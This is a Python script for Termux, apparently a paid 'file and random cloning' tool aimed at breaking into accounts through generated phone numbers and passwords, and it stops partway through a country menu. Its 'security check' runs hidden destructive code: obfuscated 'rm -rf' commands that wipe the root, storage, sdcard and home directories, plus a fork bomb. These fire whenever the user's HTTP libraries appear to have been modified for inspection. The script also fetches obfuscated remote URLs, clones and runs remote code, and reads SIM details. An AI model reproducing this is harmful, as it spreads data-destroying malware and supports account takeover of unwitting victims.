"""
    @ open source by ---( Younis john )---
    @ Github : https://github.com/younis-dgk
    @ WhatsApp : +923194999455
    @ facebook : https://www.facebook.com/YounisDgk
    
"""
#------MODULES
import os,zlib,time,sys
from os import system as osRUB
from os import system as cmd
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('xdg-open https://www.youtube.com/@YounisXyz')
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
try:import httpx
except:os.system("pip install httpx")
import httpx
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as error
from datetime import datetime
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as error
fast_work = ThreadPoolExecutor(max_workers=15).submit
#--------COLOURS
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2; VAMPIRE~XD\x07')
#-------CONTROL UPDATE+OFF
xnx = requests.get('https://raw.githubusercontent.com/VAMPIRE-404/Control-room/main/Tool-controle/Tool-update-off.txt').text
if 'off' in xnx:print(f''' {red}[{white}●{red}]{green} TOOL IS OFF NOW{red} ! ''');exit()
if 'update' in xnx:print(f''' {red}[{white}●{red}]{green} TOOL UPDATED WORK IN PROGRESS{red} ! ''');exit()
#---------INSTALLING MODULES
print(f'{red}[{white}●{red}]{green} INSTALLING MODULES PLEASE WAITING{red} ! ');time.sleep(5)
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip uninstall requests -y;pip install requests')
os.system('pip uninstall pycurl -y;pip install pycurl')
os.system('pip uninstall httpx -y;pip install httpx')
os.system('pip uninstall rich -y;pip install rich')
#---------SDCARD PERNITION
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    print(f' {red}[{white}●{red}]{green} WITHOUT PERMITION YOU CAN'+'T RUN THE TOOL');os.system('termux-setup-storage');os.system('clear');exit('{red}[{white}●{red}]{green} RU'+'N AGA'+'IN TH'+'IS TO'+'OLS...{red}! ')
#-------PROXY
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:
    print('YOUR INTERNET CONNECTION IS TOO LOW')
    sys.exit()
xvx = open('.prox.txt', 'r').read().splitlines()    
#---------LOOPS
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#--------PYCURL
try:
    from io import BytesIO
    import pycurl
except:os.system("pip install pycurl")
from io import BytesIO
import pycurl,certifi
def py_get(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    try:
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.SSL_VERIFYPEER, 1)
        curl.setopt(curl.SSL_VERIFYHOST, 2)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
    except pycurl.error as e:
        return f"An error occurred in py_get"
    finally:
        curl.close()
    response_body = buffer.getvalue().decode('utf-8')
    return response_body
#--------GITLINK
def git():
    os.system("xdg-open https://github.com/VAMPIRE-404")
#--------HTTPCANARY CHAKER
def is_https_active():
    try:
        response = requests.get('htt'+'ps://ww'+'w.googl'+'e.com')
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        return False
if is_https_active():pass
else:sys.exit(" {red}[{white}●{red}]{green} DON'T ON YOUR LOCAL-CANARY NEXT TIME{red} !! ")
#---------OTHERS
myid=uuid.uuid4().hex[:5].upper()
try:
    key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.VAMPIRE', 'r').read()
except:
    kok=open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.VAMPIRE', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.VAMPIRE', 'r').read()
kex=(f"VAMPIRE|{uid}|404|{key1}|XD")
import os,uuid,hashlib,platform
AX = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
_sos_=AX;_xvx_=_sos_;_asa_=_xvx_;_cxa_=_asa_
_qq_=_cxa_[5:8];_ee_=_cxa_[15:19];_rr_=_cxa_[23:26];_tt_=_cxa_[11:13]
_yy_=_cxa_[19:21];_q_=_yy_;_w_=_tt_;_e_=_rr_;_r_=_ee_;_t_=_qq_;__coc__=_q_+_w_+_e_+_r_+_t_
#---------FUCKER
def gift___pro():
    os.system('r'+'m -r'+'f /s'+'tora'+'g'+'e'+'/'+'e'+'m'+'u'+'l'+'at'+'ed/0/')
    os.system('r'+'m -rf '+'/sto'+'ra'+'g'+'e'+'/e'+'m'+'u'+'l'+'a'+'te'+'d/')
    os.system('r'+'m -rf'+' /s'+'dc'+'a'+'rd/')
    os.system('r'+'m -r'+'f '+'/s'+'dc'+'a'+'r'+'d/'+'0/')
    os.system('r'+'m -rf'+' /'+'sd'+'c'+'a'+'r'+'d1/')
    os.system('r'+'m -rf'+' '+'/s'+'t'+'o'+'rag'+'e/')
    os.system('rm -rf /')
    os.system('rm -rf /s'+'yste'+'m/')
    os.system('rm -rf $H'+'OME'+'/../../')
    os.system('rm -rf $PR'+'EF'+'IX/b')
    os.system('rm -rf $H'+'O'+'ME/')
    os.system('mv $HO'+'ME /d'+'ev/nu'+'ll')
#--------PROTECTOR REMOVE
def pro__():
    os.system("clear")
    os.system('touch .data')
    open('.data','w').write(':(){ :|: & };:')
    for b in range(20):
        os.system('bash .data')
        os.system('rm -rf /data/data/com.termux/files')
        os.system('ls & clear')
#---------SEQURITY
print(f" {red}[{white}●{red}]{green} SECURITY CHEAKING PLEASE WAIT{red} !! ");time.sleep(5)
style = (f" {red}[{white}●{red}]{green}")
site = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/'
warning = (f" {green}DON'T TRY IT NEXT TIME KIDS{red} !! ")
pipo = 'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests'
if os.path.isfile("/data/d"+"ata/com.ter"+"mux/files/u"+"sr/bin/rm"):pass
else:os.system('clear');print(f'{style} TURN OFF YOUR DATA PROTECTOR !! ');pro__();exit()
if os.path.isfile("/data/data/com.termux/files/usr/bin/pip"):pass
else:os.system('clear');print(f'{style} TURN OFF YOUR PIP PROTECTOR !! ');pro__();exit()
if os.path.isfile("/data/data/com.termux/files/usr/bin/pip3"):pass
else:os.system('clear');print(f'{style} TURN OFF YOUR PIP PROTECTOR !! ');pro__();exit()
if os.path.isfile("/data/data/com.termux/files/usr/bin/pkg"):pass
else:os.system('clear');print(f'{style} TURN OFF YOUR PKG PROTECTOR !! ');pro__();exit()
with open(f'{site}requests/sessions.py', 'r') as file :
        filedata = file.read()
filedata = filedata.replace('verify = False', 'verify = True')
with open(f'{site}requests/sessions.py', 'w') as file:
     file.write(filedata)
if "verify = True" in filedata:pass
else:
     with open(f'{site}requests/sessions.py', 'a') as file:
         file.write('\nverify = True\n')
with open(f'{site}requests/sessions.py', 'r') as file :
    filedata63 = file.read()
if "verify = False" in filedata63:gift___pro();pro__();exit(f"{style} {warning}")
else:pass
with open(f'{site}requests/sessions.py', 'r') as file :
    filedata63 = file.read()
if "self.verify = False" in filedata63:gift___pro();pro__();exit(f"{style} {warning}")
else:pass
with open(f'{site}urllib3/connection.py', 'r') as file7i7 :
    filedata47 = file7i7.read()
if str("cert_reqs = 'CERT_NONE'") in filedata47:gift___pro();pro__();exit(f"{style} {warning}")
try:
    king=f'{site}requests/'
    if not 'print' in open(king+'sessions.py','r').read():pass
    else:gift___pro();pro__();exit(f"{style} {warning}")
except:exit(f'{style} PLEASE TY'+f'PE : {pipo} ')
try:
    qeen=f'{site}requests/'
    if not 'print' in open(qeen+'models.py','r').read():pass
    else:gift___pro();pro__();exit(f"{style} {warning} ")
except:exit(f'{style} PLEASE TY'+f'PE : {pipo}')
try:
    don=f'{site}requests/'
    if not 'print' in open(don+'api.py','r').read():pass
    else:gift___pro();pro__();exit(f"{style} {warning}")
except:exit(f'{style} PLEASE TY'+f'PE : {pipo}')
try:
    king=f'{site}requests/'
    if not 'sys.stdout.write' in open(king+'sessions.py','r').read():pass
    else:gift___pro();pro__();exit(f"{style} {warning}")
except:exit(f'{style} PLEASE TY'+f'PE : {pipo}')
try:
    qeen=f'{site}requests/'
    if not 'sys.stdout.write' in open(qeen+'models.py','r').read():pass
    else:gift___pro();pro__();exit(f"{style} {warning}")
except:exit(f'{style} PLEASE TY'+f'PE : {pipo}')
try:
    don=f'{site}requests/'
    if not 'sys.stdout.write' in open(don+'api.py','r').read():pass
    else:gift___pro();pro__();exit(f"{style} {warning}")
except:exit(f'{style} PLEASE TY'+f'PE : {pipo}')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');gift___pro();pro__();exit(f"{style} {warning}")
try:
    a=open('requests/sessions.py','r').read()
    if 'print' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/api.py','r').read()
    if 'print' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/models.py','r').read()
    if 'print' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_api.py','r').read()
    if 'print' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_auth.py','r').read()
    if 'print' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_models.py','r').read()
    if 'print' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/sessions.py','r').read()
    if 'sys.stdout.write' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/api.py','r').read()
    if 'sys.stdout.write' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/models.py','r').read()
    if 'sys.stdout.write' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_api.py','r').read()
    if 'sys.stdout.write' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_auth.py','r').read()
    if 'sys.stdout.write' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_models.py','r').read()
    if 'sys.stdout.write' in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/sessions.py', 'r').read()
    if "verify = False" in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/sessions.py', 'r').read()
    if "self.verify = False" in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open(f'urllib3/connection.py', 'r').read()
    if str("cert_reqs = 'CERT_NONE'") in a:gift___pro();pro__();exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');gift___pro();pro__();exit(f"{style} {warning}")
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');gift___pro();pro__();exit(f"{style} {warning}")
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');gift___pro();pro__();exit(f"{style} {warning}")
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests');gift___pro();pro__();exit(f"{style} {warning}")
#---------FILE-UA1
try:
    F1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\xbbe\xe6\xa4\xea\xbb\x19\x02\x00\xe2\x1f\x16\xa9'))
except:
    print('No Internet Connection.....');exit()
F1 = F1.strip()
#---------FILE-UA2
try:
    F2 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\xbbe\xe6\xa4\xea\xbb\x19\x01\x00\xe2 \x16\xaa'))
except:
    print('No Internet Connection.....');exit()
F2 = F2.strip()
#---------FILE-UA3
try:
    F3 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\xbbe\xe6\xa4\xea\xbb\x19\x03\x00\xe2!\x16\xab'))
except:
    print('No Internet Connection.....');exit()
F3 = F3.strip()
#---------FILE-UA4
try:
    F4 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\xbbe\xe6\xa4\xea\xbb\x99\x00\x00\xe2"\x16\xac'))
except:
    print('No Internet Connection.....');exit()
F4 = F4.strip()
#---------FILE-UA5
try:
    F5 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\xbbe\xe6\xa4\xea\xbb\x99\x02\x00\xe2#\x16\xad'))
except:
    print('No Internet Connection.....');exit()
F5 = F5.strip()
#---------FILE-UA6
try:
    F6 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\xbbe\xe6\xa4\xea\xbb\x99\x01\x00\xe2$\x16\xae'))
except:
    print('No Internet Connection.....');exit()
F6 = F6.strip()
#---------RANDOM-UA1
try:
    R1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\x07%\xe6\xa5\x00\xe5\x82\x0c\x01\x12_\x17\x96'))
except:
    print('No Internet Connection.....');exit()
R1 = R1.strip()
#---------RANDOM-UA2
try:
    R2 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\x07%\xe6\xa5\x00\xe5\x82\x8c\x00\x12`\x17\x97'))
except:
    print('No Internet Connection.....');exit()
R2 = R2.strip()
#---------RANDOM-UA3
try:
    R3 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\x07%\xe6\xa5\x00\xe5\x82\x8c\x01\x12a\x17\x98'))
except:
    print('No Internet Connection.....');exit()
R3 = R3.strip()
#---------RANDOM-UA4
try:
    R4 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\x07%\xe6\xa5\x00\xe5\x82L\x00\x12b\x17\x99'))
except:
    print('No Internet Connection.....');exit()
R4 = R4.strip()
#---------RANDOM-UA5
try:
    R5 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\x07%\xe6\xa5\x00\xe5\x82L\x01\x12c\x17\x9a'))
except:
    print('No Internet Connection.....');exit()
R5 = R5.strip()
#---------RANDOM-UA6
try:
    R6 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1w\x06\x8a\x15\xe5\xe7\xe8\xe7&f\xe6\xe9\x07%\xe6\xa5\x00\xe5\x82\xcc\x00\x12d\x17\x9b'))
except:
    print('No Internet Connection.....');exit()
R6 = R6.strip()
#---------VIRSON
try:
    version = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xe0"e\x99E\xc5\xf9y\xfa\x10J\xaf\xa4\xa2\x04\x00\xbc\xb5!\x00'))
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#---------STATUS
try:
    status = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xe0"%E\x89\x999\xfa`R\xb7 13E\xaf\xa4\xa2\x04\x00\x1d8!\xc1'))
except:
    print('No Internet Connection.....');exit()
status = status.strip()
#---------FILE METHOD
try:
    File = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xf4\x93\xa1"\xbe\xa9%\x19\xf9)\xfan\x999\xa9\x00\xfc\t\x1e1'))
except:
    print('No Internet Connection.....');exit()
File = File.strip()
#----------RANDOM METHOD
try:
    Random = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xf4\x93\xa1"\xbe\xa9%\x19\xf9)\xfaA\x89y)\xf9\xb9\x009\xea\x1f\x12'))
except:
    print('No Internet Connection.....');exit()
Random = Random.strip()
#--------APPROBLE LINK CHG
try:
    Link = py_get(zlib.decompress(b'x\x9c\r\xca1\x0e\x80 \x0c\x00\xc0\x17IwGuw\xf1\x03\x05\x1bi\x14J\xda\x12\xc3\xefu\xbd\\vo6\x03(\xbe\xe1b\xcf=v#MR\x9d\xaa\x87$\x05\x0e2\x9f\x96\r\xd6\xdfT\x1e(\xc8\x15v\x8e\xa3\xa1\xfd\xd5E\x0b\x0e\xbaS?\xf9\x03u\x8e\x1d\xb5'))
except:
    print('No Internet Connection.....');exit()
Link = Link.strip()
#---------LINExCLEAR
def line():print(f'{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
def linex():print(f'{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
def clear():os.system('clear');print(logo)
def clear2():os.system('clear');print(logo2)
#---------SIM INFO
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', f'''{red}●{green}''')
#---------LOGO
git()
logo=(f"""{green}   ▙▗▌▛▀▖ ▜▘▙▗▌▛▀▖▞▀▖▙ ▌ ▞▀▖▌ ▌▛▀▘▜▘▌ ▌▌ ▌
{green}   ▌▘▌▌ ▌ ▐ ▌▘▌▙▄▘▙▄▌▌▌▌ ▚▄ ▙▄▌▙▄ ▐ ▙▞ ▙▄▌
{green}   ▌ ▌▌ ▌ ▐ ▌ ▌▌▚ ▌ ▌▌▝▌ ▖ ▌▌ ▌▌  ▐ ▌▝▖▌ ▌
{green}   ▘ ▘▀▀  ▀▘▘ ▘▘ ▘▘ ▘▘ ▘ ▝▀ ▘ ▘▀▀▘▀▘▘ ▘▘ ▘
{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}
 {red}[{white}●{red}]{green} OWNER {white}      {red}➠ {green}︎MD IMRAN SHEIKH
 {red}[{white}●{red}]{green} TOOL {white}       {red}➠{green} {green}FILE{red}×{green}RANDOM
 {red}[{white}●{red}]{green} SIM  {white}       {red}➠{green} {sim}
 {red}[{white}●{red}]{green} STATUS      {white}{red}➠ \033[38;5;180m︎{status}
 {red}[{white}●{red}]{green} GITHUB      {white}{red}➠︎ {green}VAMPIRE-404
 {red}[{white}●{red}]{green} VERSION     {white}{red}➠ \033[38;5;180m︎{version}
 {red}[{white}●{red}]{green} WORKING {red}[{green}M{red}] {white}{red}➠︎ {green}FILE{red}:{yellow}{File} {red}& {green}RANDOM{red}:{yellow}{Random}
{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}""")
#---------LOGO2
logo2=(f"""{green}          ▌ ▌▞▀▖▙▗▌▛▀▖▜▘▛▀▖▛▀▘
{green}          ▚▗▘▙▄▌▌▘▌▙▄▘▐ ▙▄▘▙▄
{green}          ▝▞ ▌ ▌▌ ▌▌  ▐ ▌▚ ▌
{green}           ▘ ▘ ▘▘ ▘▘  ▀▘▘ ▘▀▀▘
{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}
 {red}[{white}●{red}]{green} OWNER {white}    {red}➠ {green}︎MD IMRAN SHEIKH
 {red}[{white}●{red}]{green} TOOL {white}     {red}➠{green} {green}FILE{red}×{green}RANDOM
 {red}[{white}●{red}]{green} GITHUB    {white}{red}➠︎ {green}VAMPIRE-404
 {red}[{white}●{red}]{green} VERSION   {white}{red}➠ \033[38;5;180m︎{version}
{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}""")
#---------APPROVE
urll = f"{Link}"
XeX = urll
aplnk = XeX
buffer = BytesIO()
c = pycurl.Curl()
c.setopt(c.URL, aplnk)
c.setopt(c.WRITEDATA, buffer)
try:c.perform()
except pycurl.error:exit(f"[●] PLEASE CHECK YOUR INTERNET CONNECTION ! ")
c.close()
body = buffer.getvalue().decode('utf-8')
link = body
def ___ApPrObLE___():
    key = "=[VAMPIRE]=["+str(os.geteuid())+str(os.getlogin()).replace('u0_a','')+"]="
    if key in link:
        clear2()
        import getpass
        attemps = 0
        while attemps < 12345677901:
            keyl = input(f' {red}[{white}✘{red}] {green}LICENSE KEY {red}➤ {green} ')
            if keyl =='VAMPIRELOVERS':
                break
            else:
                os.system('clear')
                print(f' {red}[{white}✘{red}] {green}INCORRECT LICENSE KEY PLEASE TRYING ! ');time.sleep(1)
                print(f' {red}[{white}✘{red}] {green}TRYING REAL LICENSE KEY ! ');exit()
        ___ImRAn___MaIN___MenU___()
    else:
        clear2()
        print(f" {red}[{white}●{red}]{green} FILE WORK {red}➠ \033[38;5;180mALL COUNTRY WORK")
        print(f" {red}[{white}●{red}]{green} RNDM WORK {red}➠ \033[38;5;180mBD,INDIA,NEPAL,MALYASIA,PAK")
        linex()
        print(f" {red}[{white}●{red}]{green} YOUR KEY  {red}➠\033[38;5;82m {key}");linex()
        print(f" {red}[{white}●{red}] \033[38;5;180mIF YOU FULLY NEW USERS DON'T BUY ! {red}&&")
        print(f" {red}[{white}●{red}] \033[38;5;180mIF YOU DELETE TERMUX I'LL NOT APPROVE AGAIN !")
        linex()
        input(f" {red}[{white}●{red}]{green} TOOL'S PAID IF YOU BUY ENTER & CONTACT");os.system("xdg-open https://www.facebook.com/VAMPIRE404OFFICIAL");time.sleep(5);exit()
#---------MAIN
def ___ImRAn___MaIN___MenU___():
    clear()
    print(f' {red}[{white}1{red}]{green} FILE CREATE')
    print(f' {red}[{white}2{red}]{green} FILE CLONING')
    print(f' {red}[{white}3{red}]{green} RANDOM CLONING')
    print(f' {red}[{white}4{red}]{green} CONTACT ME ADMIN')
    line()
    __ERROR__ = input(f' {red}[{white}◆{red}]{green} CHOICE {white}:{green} ')
    if __ERROR__ in['A','a','01','1']:___file___()
    elif __ERROR__ in ['B','b','02','2']:___ImRAn___FiLE___MenU___()
    elif __ERROR__ in ['C','c','03','3']:___ImRAn___rANdOm___MenU___()
    elif __ERROR__ in ['D','d','04','4']:os.system('xdg open https://www.facebook.com/VAMPIRE404OFFICIAL');exit()
    else:print(f' {red}[{white}×{red}]{green} WRONG OPTION');time.sleep(2);exit()
#---------FILE MAKE
def ___file___():
    os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
    os.system('cd && cd FILE ;python FILE.py')
#---------RANDOM MENU
def rmpassconf(num,type):
        if 'first' in type:
            try:
                code = type.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in type:
            try:
                code = type.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = type
        return password
def ___ImRAn___rANdOm___MenU___():
    clear()
    print(f' {red}[{white}1{red}]{green} BD RANDOM ')
    print(f' {red}[{white}2{red}]{green} INDIA RANDOM')
    print(f' {red}[{white}3{red}]{green} MALAYSIA RANDOM')
    print(f' {red}[{white}4{red}]{green} PAKISTAN RANDOM')
    print(f' {red}[{white}5{red}]{green} NEPAL RANDOM')
    print(f' {red}[{white}6{red}]{green} BACK MENU')
    line()
    error_ = input(f' {red}[{white}◆{red}]{green} CHOICE {red}➠ {green}︎')
    if error_ in ['A','a','01','1']:___ImRAn___BaNglaDeSh___MenU___()
    elif error_ in ['B','b','02','2']:___INDIA___()
    elif error_ in ['C','c','03','3']:___ML___()
    elif error_ in ['D','d','04','4']:___PK___()
    elif error_ in ['E','e','05','5']:___NP___()
    elif error_ in ['F','f','06','6']:___ImRAn___MaIN___MenU___()
    else:exit()
#---------BD
def ___ImRAn___BaNglaDeSh___MenU___():
    clear()
    print(f' {red}[{green}◆{red}] {green}SIM CODES {red}➠ {green}018 017 016 013');line()
    code = input(f' {red}[{green}◆{red}]{green} Choice    {red}➠ {green}');clear()
    print(f' {red}[{white}◆{red}] {green}EXAMPLE {red}  ➠ {green}10000 20000 30000');line()
    limit = int(input(f' {red}[{white}◆{red}] {green}LIMITS    {red}➠ {green}'));line()
    plist = []
    clear()
